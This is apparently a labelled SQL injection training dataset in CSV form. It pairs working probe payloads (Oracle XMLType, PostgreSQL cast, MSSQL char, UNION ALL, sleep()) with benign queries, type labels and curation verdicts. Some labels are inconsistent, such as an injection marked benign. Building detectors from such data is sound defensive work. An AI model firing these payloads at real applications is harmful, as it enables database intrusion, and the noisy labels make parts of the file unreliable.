payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
SELECT AVG ( threw ) FROM thing SELECT SUM ( fair ),benign,generic,1.0,Normal SELECT with AVG and SUM,SELECT AVG ( threw ) FROM thing SELECT SUM ( fair ),False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),KEEP,
nicholls@devuelos.vu,benign,generic,0.9,not_sql_injection,nicholls@devuelos.vu,False,0,__IDENT__@__IDENT__,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""1\'",error_based,postgresql,0.9,PostgreSQL char() concatenation for errors,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""1\'",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' ) ) ) and __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) and ( ( ( \'__IDENT__\' = \'__IDENT__ or __IDENT__ = ""__INT__\'",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users WHERE username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) and username = ""1"" and username = ""-1254""",error_based,oracle,0.95,select from dual xmltype error,1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694,True,1,__INT__ ) ) ) and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( ( ( __INT__ = __INT__,KEEP,
"select * from users WHERE username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( 8254 = 8254"" or username = ""1\'+ ( select \'kicv\' where 1976 = 1976",error_based,oracle,0.95,Oracle XMLType + select,"select * from users WHERE username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( 8254 = 8254"" or username = ""1\'+ ( select \'kicv\' where 1976 = 1976",False,0,select * from __IDENT__ where __IDENT__ = __INT__ ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- and ( ( __INT__ = 8254__STR__1\' + ( select \'__IDENT__\' where __INT__ = __INT__,KEEP,
SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,benign,generic,1.0,Normal SELECT with LIMIT and WHERE,SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,False,0,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,KEEP,
"SELECT rateID AS ID, avoid AS recall FROM rice",benign,mysql,0.9,not_sql_injection,"SELECT rateID AS ID, avoid AS recall FROM rice",False,0,"select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",RELABEL,reasoning too short (17 chars)
23291292c,benign,generic,0.9,not_sql_injection,23291292c,False,0,23291292c,RELABEL,reasoning too short (17 chars)
"-7041"" ) ) ) union all select 2159,2159,2159,2159,2159--",union_based,generic,0.7,union_select,"-7041"" ) ) ) union all select 2159,2159,2159,2159,2159--",False,0,"-__INT__"" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",RELABEL,reasoning too short (12 chars)
"select * from users WHERE username = ""-5863"" and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.85,PostgreSQL cast extraction,1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,__INT__\' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) --,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
whit,benign,generic,0.9,not_sql_injection,whit,False,0,__IDENT__,DROP,payload too short (4 chars)
"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.9,cast numeric postgresql,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,"__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = __STR__-__INT__\' ) ) ) or __IDENT__ = ""-__INT__\' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) ::__IDENT__ || ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) as __IDENT__ ) --",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",boolean_blind,mysql,0.8,). obfuscation for boolean-based blind SQLi,"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",False,0,select * from __IDENT__ where __IDENT__ = __INT__ or __STR__ = __INT__ or __INT__ = __INT__ -- __INT__,KEEP,
"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,upper xmltype Oracle extraction,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__-__INT__ ) ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ),KEEP,
SELECT native FROM independent UNION SELECT moon FROM ride ORDER BY snow,benign,generic,1.0,Normal SELECT with UNION and ORDER BY,SELECT native FROM independent UNION SELECT moon FROM ride ORDER BY snow,False,0,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,RELABEL,benign payload contains 'union' (likely false negative)
"1%"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,"1%"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,False,0,"__INT__ % or __INT__ = ( select __IDENT__ ( * ) from __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ , __IDENT__$__IDENT__ as __IDENT__ ) and % __STR__",KEEP,
"select * from users WHERE username = ""-8828%\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'""",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,"-8828%\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",True,1,"-__INT__ % \' ) ) ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) or __IDENT__ = ""-__INT__ % \' ) ) ) or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and ( ( ( \' % \' = \'",KEEP,
SELECT * FROM wp_posts WHERE ID = 239189 LIMIT 1,benign,mysql,0.9,not_sql_injection,SELECT * FROM wp_posts WHERE ID = 239189 LIMIT 1,False,0,select * from __IDENT__ where __IDENT__ = __INT__ limit __INT__,RELABEL,reasoning too short (17 chars)
SELECT option_value FROM wp_options WHERE option_name = 'sm_organize_media' LIMIT 1,benign,mysql,0.9,not_sql_injection,SELECT option_value FROM wp_options WHERE option_name = 'sm_organize_media' LIMIT 1,False,0,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,RELABEL,reasoning too short (17 chars)
SELECT * FROM nearby WHERE raw NOT LIKE '[depth]%',benign,generic,1.0,Normal SELECT with NOT LIKE pattern,SELECT * FROM nearby WHERE raw NOT LIKE '[depth]%',False,0,select * from __IDENT__ where __IDENT__ not like __STR__,KEEP,
corb9ch4da,benign,generic,0.9,not_sql_injection,corb9ch4da,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
SELECT * FROM weak WHERE smaller NOT BETWEEN 'unit' AND 'dear',benign,generic,1.0,Normal SELECT with NOT BETWEEN,SELECT * FROM weak WHERE smaller NOT BETWEEN 'unit' AND 'dear',False,0,select * from __IDENT__ where __IDENT__ not between __STR__ and __STR__,KEEP,
"select * from users WHERE username = ""-9987 ) ) ) and ( ( 8254 = 8254"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""",error_based,oracle,0.85,basic Oracle injection,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",True,1,"-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = ""__INT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"SELECT seasonID AS ID, means AS known FROM weigh",benign,generic,1.0,Normal SELECT with column alias,"SELECT seasonID AS ID, means AS known FROM weigh",False,0,"select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",KEEP,
SELECT * FROM ( SELECT hand FROM wore ),benign,generic,1.0,Normal SELECT subquery,SELECT * FROM ( SELECT hand FROM wore ),False,0,select * from ( select __IDENT__ from __IDENT__ ),KEEP,
1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,False,0,__INT__ % ' ) or ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) #,KEEP,
"select * from users WHERE username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) ) )",error_based,oracle,0.95,select from dual xmltype,"select * from users WHERE username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) ) )",False,0,"select * from __IDENT__ where __IDENT__ = -__INT__\' where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- and __IDENT__ = ""__INT__ ) ) )",KEEP,
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-1985 ) ) )",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-1985 ) ) )",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) or __IDENT__ = ""-__INT__ ) ) )",KEEP,
SELECT * FROM vertical WHERE mix NOT LIKE '[grown]%',benign,generic,1.0,Normal SELECT with NOT LIKE pattern,SELECT * FROM vertical WHERE mix NOT LIKE '[grown]%',False,0,select * from __IDENT__ where __IDENT__ not like __STR__,KEEP,
"select * from users WHERE username = ""1%\' ) ) ) and username = ""-2756\' where 6156 = 6156 or username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",error_based,oracle,0.95,Oracle xmltype extraction,"1%\' ) ) ) and username = ""-2756\' where 6156 = 6156 or username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",True,1,__INT__ % \' ) ) ) and __IDENT__ = __STR__-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) --,KEEP,
SELECT * FROM lead WHERE grandmother = 'zipper' OR brought = 'having',benign,generic,1.0,Normal SELECT with multiple WHERE conditions,zipper' OR brought = 'having,True,1,__IDENT__,KEEP,
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,oracle,0.9,XMLType + MSSQL convert,"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) or __IDENT__ = ""-__INT__ % \' ) ) ) or __INT__ = convert ( __IDENT__ , ( select char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",KEEP,
SELECT * FROM ( SELECT writing FROM in ),benign,generic,1.0,Normal SELECT with subquery,SELECT * FROM ( SELECT writing FROM in ),False,0,select * from ( select __IDENT__ from in ),KEEP,
3u23pe,benign,generic,0.9,not_sql_injection,3u23pe,False,0,3u23pe,RELABEL,reasoning too short (17 chars)
-2920' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rzey' = 'rzey,error_based,oracle,0.9,oracle_cast,-2920' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rzey' = 'rzey,False,0,-__INT__ ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) and ( ( __IDENT__,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
-3881 ) ) ) union all select 4438--,union_based,generic,0.85,UNION ALL for union-based,-3881 ) ) ) union all select 4438--,False,0,-__INT__ ) ) ) union all select __INT__ --,KEEP,
maraa,benign,generic,0.9,not_sql_injection,maraa,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
incom1a5abl8mente,benign,generic,0.9,not_sql_injection,incom1a5abl8mente,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
